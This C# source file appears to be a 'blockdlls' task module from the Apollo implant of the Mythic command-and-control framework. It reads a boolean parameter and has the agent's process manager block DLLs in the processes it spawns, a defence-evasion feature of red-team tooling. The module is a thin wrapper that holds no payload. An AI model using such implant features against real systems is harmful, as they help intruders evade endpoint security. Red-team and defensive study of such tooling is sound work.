#define COMMAND_NAME_UPPER

#if DEBUG
#define BLOCKDLLS
#endif

#if BLOCKDLLS
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;

namespace Tasks
{
    public class blockdlls : Tasking
    {
        [DataContract]
        internal struct BlockDllsParameters
        {
            [DataMember(Name = "block")]
            public bool Value;
        }
        public blockdlls(IAgent agent, Task task) : base(agent, task)
        {

        }

        public override void Start()
        {
            BlockDllsParameters parameters = _jsonSerializer.Deserialize<BlockDllsParameters>(_data.Parameters);
            _agent.GetProcessManager().BlockDLLs(parameters.Value);
            _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", true));
        }
    }
}
#endif